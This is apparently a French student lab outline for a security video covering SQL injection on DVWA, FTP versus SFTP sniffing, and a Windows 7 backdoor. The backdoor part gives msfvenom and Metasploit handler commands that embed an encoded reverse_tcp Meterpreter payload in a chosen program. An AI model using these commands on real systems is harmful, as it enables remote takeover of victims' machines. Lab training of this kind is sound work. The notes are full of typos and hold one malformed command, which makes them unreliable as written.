NGUELIFACK AWOUNFACK BRIGHT 

TSOPZONG HEROUANE 


lien google drive 

https://drive.google.com/file/d/1Mcbq2CL3I6ArNyT0ZqVg6arLITvk4RHP/view?usp=sharing



------------------ video -----------------
partie 1 : l'attaque SQL injrction sur une base de donnée de metaploitable2 DVWA

partie 2 : Attaque par bachdoor 
	-kali linux attaquante 
	-windows 7 
Dans notre machine kali nous allons cree notre backdoor en utilisant la commande 
msfvenom -a x86 --platforme windows -x nom_du_logiciel -k -p windows/meterpreter/reverse_tcp lhost= add_ip
lport=nom_du_port -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o "non_de_sorti.exe"

executer le code et ce rendre dans le repertoir ou est stocker notre backdoor puis l'intaller dans notre machine windows 
cible 

et nous revenons sur notre kali et lancons le module msconsole 
>use exploit/multi/handler 
>set windows/meterpreter/reverse_tcp
>set lhost ip_attaquant
>set lport nom_port
>run ( pour lancer l'attaque et attendre que la cible execute le backdoor)



partie 3 : sniffing du protacole FTP (ici tout est en clair dans wireshark)

ftp add_ip
entrez le nom_user
entrez le mot_pass_user
on peut faire un "get d'un fichier a fin de le telecharger sur notre machine  


partie 4 : snifing du SFTP (ici tout est encripter et non exploitable a partir de wireshark)
 sftp -okeyAlgorithme=+ssh_rsa nom_user@addr_ip
 on peut faire un "get d'un fichier afin de le telecharger sur notre machine 